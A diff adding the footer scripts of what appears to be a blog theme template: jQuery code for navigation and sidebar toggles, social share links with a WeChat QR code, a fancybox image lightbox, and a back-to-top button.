+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
